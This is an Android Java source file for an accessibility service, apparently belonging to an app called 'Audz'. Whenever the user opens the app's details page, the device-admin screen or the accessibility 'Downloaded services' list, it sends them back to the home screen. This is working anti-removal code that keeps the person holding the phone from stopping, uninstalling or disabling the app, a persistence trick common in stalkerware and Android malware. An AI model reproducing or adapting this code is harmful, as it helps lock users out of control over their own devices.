package com.audz;

import java.util.List;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import android.util.Log;

public class MyAccessibilityService extends AccessibilityService {
  @Override
  public void onAccessibilityEvent(AccessibilityEvent event) {
    Log.d("MyAccessibilityService", "Event triggered: " + event.getEventType());

    String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
    AccessibilityNodeInfo rootNode = getRootInActiveWindow();

    if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
      // Log.d("MyAccessibilityService", "Window changed in package: " + packageName);
      String className = event.getClassName().toString();
      Log.d("MyAccessibilityService", "itu ga rispek bgt wok " + className);
      if (className.equals("com.miui.appmanager.ApplicationsDetailsActivity")) {
        // Launch your lock screen or terminate the app.
        // performGlobalAction(GLOBAL_ACTION_HOME); // Example: Take the user to Home.
        if(rootNode != null) {
          List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText("Audz");
          for (AccessibilityNodeInfo node : nodes) {
            performGlobalAction(GLOBAL_ACTION_HOME);
          }
        }
      }
      if (className.equals("com.android.settings.applications.specialaccess.deviceadmin.DeviceAdminAdd")) {
        // Launch your lock screen or terminate the app.
        performGlobalAction(GLOBAL_ACTION_HOME); // Example: Take the user to Home.
      }
    }

    
    if(rootNode != null) {
      List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText("Downloaded services");
      for (AccessibilityNodeInfo node : nodes) {
        performGlobalAction(GLOBAL_ACTION_HOME);
      }
    }

    // Log.d("MyAccessibilityService", "Nih nama paketnya: " + packageName);
  }

  @Override
  public void onInterrupt() {
    Log.d("MyAccessibilityService", "Service interrupted.");
  }
}

